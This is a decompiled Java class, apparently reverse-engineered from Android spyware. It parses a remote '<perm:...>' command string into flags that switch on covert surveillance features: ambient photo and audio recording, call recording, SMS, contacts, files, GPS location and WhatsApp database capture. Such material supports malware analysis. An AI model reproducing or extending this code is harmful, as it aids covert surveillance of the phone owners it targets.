package com.security.b;

import java.util.HashMap;
import java.util.regex.Pattern;

public class c
  implements a
{
  public final b a = b.c;
  private final Pattern b = Pattern.compile("<perm:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}:\\d{1}>");
  
  public HashMap<String, Object> a(String paramString)
  {
    String[] arrayOfString = paramString.replaceAll("<", "").replace(">", "").split(":");
    paramString = new HashMap();
    boolean bool1 = arrayOfString[1].equals("1");
    boolean bool2 = arrayOfString[2].equals("1");
    boolean bool3 = arrayOfString[3].equals("1");
    boolean bool4 = arrayOfString[4].equals("1");
    boolean bool5 = arrayOfString[5].equals("1");
    boolean bool6 = arrayOfString[6].equals("1");
    boolean bool7 = arrayOfString[7].equals("1");
    boolean bool8 = arrayOfString[8].equals("1");
    boolean bool9 = arrayOfString[9].equals("1");
    boolean bool10 = arrayOfString[10].equals("1");
    boolean bool11 = arrayOfString[11].equals("1");
    boolean bool12 = arrayOfString[12].equals("1");
    boolean bool13 = arrayOfString[13].equals("1");
    boolean bool14 = arrayOfString[14].equals("1");
    boolean bool15 = arrayOfString[15].equals("1");
    boolean bool16 = arrayOfString[16].equals("1");
    paramString.put("name", this.a);
    paramString.put("ambPhotoActive", Boolean.valueOf(bool1));
    paramString.put("ambRecActive", Boolean.valueOf(bool2));
    paramString.put("appListActive", Boolean.valueOf(bool3));
    paramString.put("callListActive", Boolean.valueOf(bool4));
    paramString.put("callRecActive", Boolean.valueOf(bool5));
    paramString.put("contactsActive", Boolean.valueOf(bool6));
    paramString.put("filesActive", Boolean.valueOf(bool7));
    paramString.put("gpsAndCellsActive", Boolean.valueOf(bool8));
    paramString.put("ipAddressActive", Boolean.valueOf(bool9));
    paramString.put("smsActive", Boolean.valueOf(bool10));
    paramString.put("urlActive", Boolean.valueOf(bool11));
    paramString.put("whatsappActive", Boolean.valueOf(bool12));
    paramString.put("whatsappDbActive", Boolean.valueOf(bool13));
    paramString.put("whatsappRtActive", Boolean.valueOf(bool14));
    paramString.put("wifiOnlySend", Boolean.valueOf(bool15));
    paramString.put("redirectOperationsOut", Boolean.valueOf(bool16));
    return paramString;
  }
  
  public Pattern a()
  {
    return this.b;
  }
}


/* Location:              ~/com/security/b/c.class
 *
 * Reversed by:           J
 */